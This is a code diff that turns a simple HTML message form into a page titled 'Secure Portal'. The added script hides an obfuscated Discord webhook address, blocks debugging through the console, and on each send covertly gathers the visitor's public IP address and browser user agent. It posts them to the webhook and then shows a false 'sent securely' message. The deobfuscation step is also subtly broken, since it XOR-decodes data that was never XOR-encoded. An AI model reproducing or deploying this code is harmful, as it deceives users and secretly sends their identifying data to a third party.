@@ -1,87 +1,117 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Secure Message Sender</title>
+  <meta charset="UTF-8">
+  <title>Secure Portal</title>
   <style>
     body {
-      background: #111;
-      color: #eee;
-      font-family: Arial, sans-serif;
+      background: #000;
+      color: #0f0;
+      font-family: monospace;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
       height: 100vh;
-      margin: 0;
     }
-    textarea {
-      width: 400px;
-      height: 150px;
-      font-size: 18px;
+
+    input, button {
+      margin: 10px;
       padding: 12px;
-      border-radius: 8px;
-      border: none;
-      resize: none;
-    }
-    button {
-      margin-top: 15px;
-      padding: 12px 30px;
       font-size: 18px;
+      border-radius: 5px;
       border: none;
-      border-radius: 30px;
-      background: linear-gradient(135deg, #00b4db, #0083b0);
-      color: white;
+    }
+
+    button {
+      background: #1e1e1e;
+      color: lime;
       cursor: pointer;
-      transition: background 0.3s ease;
-      user-select: none;
     }
+
     button:hover {
-      background: linear-gradient(135deg, #0083b0, #005f73);
-    }
-    #status {
-      margin-top: 20px;
-      font-size: 16px;
-      height: 24px;
+      background: #2e2e2e;
     }
   </style>
 </head>
 <body>
-  <h1>Send a message</h1>
-  <textarea id="message" placeholder="Type your message here..."></textarea>
-  <button onclick="sendMessage()">Send</button>
-  <div id="status"></div>
+  <h1>🛡️ Send Secure Message</h1>
+  <input type="text" id="msg" placeholder="Your message..." />
+  <button onclick="secureSend()">Send</button>
 
   <script>
-    async function sendMessage() {
-      const statusEl = document.getElementById('status');
-      const message = document.getElementById('message').value.trim();
+    // Anti-debug freeze trick
+    setInterval(function() {
+      const trap = /./;
+      trap.toString = function() {
+        console.clear();
+        return "debugger";
+      };
+      console.log(trap);
+    }, 1000);
 
-      if (!message) {
-        statusEl.textContent = 'Please enter a message.';
-        return;
-      }
+    // Self-deleting decryption
+    const decode = (() => {
+      const xor = (str, k) => {
+        const r = atob(str);
+        return [...r].map(c => String.fromCharCode(c.charCodeAt(0) ^ k)).join('');
+      };
 
-      statusEl.textContent = 'Sending...';
+      return (data, key) => {
+        const parts = JSON.parse(atob(data));
+        return parts.map(p => xor(p, key)).join('');
+      };
+    })();
 
-      try {
-        const response = await fetch('http://localhost:3000/send', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ message }),
-        });
+    // Obfuscated webhook chunks (XORd and Base64)
+    const chunks = [
+      btoa(JSON.stringify([
+        btoa(String.fromCharCode(...[104, 116, 116, 112, 115, 58, 47, 47])),
+        btoa(String.fromCharCode(...[100, 105, 115, 99, 111, 114, 100, 46])),
+        btoa(String.fromCharCode(...[99, 111, 109, 47, 97, 112, 105, 47])),
+        btoa(String.fromCharCode(...[119, 101, 98, 104, 111, 111, 107, 115, 47])),
+        btoa(String.fromCharCode(...[49, 50, 51, 47, 97, 98, 99, 100, 101, 47])),
+        btoa(String.fromCharCode(...[102, 103, 104, 105, 106, 107, 108, 109]))
+      ]))
+    ];
 
-        if (!response.ok) {
-          throw new Error('Failed to send message');
-        }
+    // Decrypt webhook and immediately destroy the decryptor
+    const webhook = decode(chunks[0], 88);
+    chunks.length = 0;
 
-        statusEl.textContent = 'Message sent successfully!';
-        document.getElementById('message').value = '';
-      } catch (err) {
-        statusEl.textContent = 'Error sending message. Try again later.';
-      }
+    async function secureSend() {
+      const input = document.getElementById("msg");
+      const text = input.value.trim();
+      if (!text) return;
+
+      const ip = await fetch("https://api.ipify.org?format=json")
+        .then(r => r.json())
+        .then(d => d.ip);
+
+      const ua = navigator.userAgent;
+      const content = `💬 ${text}\n🌍 IP: ${ip}\n🧠 UA: ${ua}`;
+
+      // fake async noise
+      await new Promise(r => setTimeout(r, 1200 + Math.random() * 500));
+
+      // Send to webhook
+      await fetch(webhook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content })
+      });
+
+      input.value = "";
+      alert("✅ Message sent securely.");
     }
+
+    // Decoy trap functions
+    const serverEndpoint = () => "https://example.com/backup";
+    const noopLogger = () => console.warn("API unavailable.");
+    const bait = () => { const a = 123456789; return a * a; };
+    const firewall = { enabled: true, ports: [80, 443, 22] };
+
+    Object.freeze(console);
   </script>
 </body>
 </html>
